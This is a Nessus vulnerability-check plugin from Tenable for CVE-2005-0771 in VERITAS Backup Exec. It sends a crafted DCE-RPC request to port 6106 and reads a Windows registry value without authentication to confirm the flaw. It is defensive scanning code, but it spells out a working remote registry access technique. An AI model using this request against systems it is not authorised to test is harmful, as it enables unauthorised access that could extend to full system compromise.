#
# (C) Tenable Network Security
#
#
# Thanks to Metasploit and Pedram Amini for :
# - let me know there was a flaw in veritas RPC for windows
# - give the RPC structure for this function (I don't even have to reverse it ;-)

desc = "
Synopsis :

Arbitrary code can be executed on the remote host.

Description :

The remote host is running a version of VERITAS Backup Exec for
Windows which is vulnerable to a remote registry access.  An attacker
may exploit this flaw to modify the remote registry and gain a full
access to the system. 

To exploit this flaw, an attacker would need to send requests to the
RPC service listening on port 6106. 

The patch for this vulnerability fix others remote flaw (buffer overflows)
that may allow an attacker to execute code on the remote host with SYSTEM
privileges.

Solution :

http://seer.support.veritas.com/docs/276605.htm

Risk factor :

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


if(description)
{
 script_id(19397);
 script_version("$Revision: 1.6 $");
 script_cve_id("CVE-2005-0771");
 script_bugtraq_id(14020);
 script_xref(name:"IAVA", value:"2005-B-0014");
 script_xref(name:"OSVDB", value:"17627");


 name["english"] = "VERITAS Backup Exec Agent Registry Access Vulnerability";

 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Test the VERITAS Backup Exec Agent Registry Access";

 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 
 script_require_ports(6106);
 exit(0);
}

include ('smb_func.inc');

global_var reg_val;

function RPCReadRegistry (socket)
{
 local_var ret, resp, data, len, code;

 session_set_unicode (unicode:1);

 ret = dce_rpc_bind(cid:session_get_cid(), uuid:"93841fd0-16ce-11ce-850d-02608c44967b", vers:1);
 send (socket:socket, data:ret);
 resp = recv (socket:socket, length:4096);

 if (!resp)
 {
  close (socket);
  return 0; 
 }

 ret = dce_rpc_parse_bind_ack (data:resp);
 if (isnull (ret) || (ret != 0))
 {
  close (socket);
  return 0;
 }

 data =  class_name (name:"SOFTWARE\Microsoft\Windows NT\CurrentVersion") +
	 class_name (name:"ProductName") +
	 raw_dword (d:REG_SZ) +
	 raw_dword (d:0x100) +
	 raw_dword (d:0) +
	 raw_dword (d:4) +
	 raw_dword (d:4) +
	 raw_dword (d:HKEY_LOCAL_MACHINE+CAP_EXTENDED_SECURITY);

 ret = dce_rpc_request (code:0x04, data:data);
 send (socket:socket, data:ret);
 resp = recv (socket:socket, length:4096);

 close (socket);

 resp = dce_rpc_parse_response (data:resp);
 # no correct answer but it is vulnerable anyway
 if (strlen(resp) < 8)
   return 1;

 code = get_dword (blob:resp, pos:0);
 if (code != 1)
   return 1; # non existring key / access error

 len = get_dword (blob:resp, pos:4);
 if (strlen(resp) < 8 + len)
   return 1;

 reg_val = unicode2ascii(string:substr(resp,8,8+len-1));
 
 return 2;
}

port = 6106;
if ( ! get_port_state(port) ) exit(0);
soc = open_sock_tcp (port);
if (!soc) exit (0);

rpc_ans = RPCReadRegistry (socket:soc);
if (rpc_ans == 1)
  security_hole(port);
else if (rpc_ans == 2)
{
 desc_txt = "It was possible to read the value of the following registry key :
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName

which is :
" + reg_val;

 report = string (desc,
		"\n\nPlugin output :\n\n",
		desc_txt);

 security_hole(port:port, data:report);
}
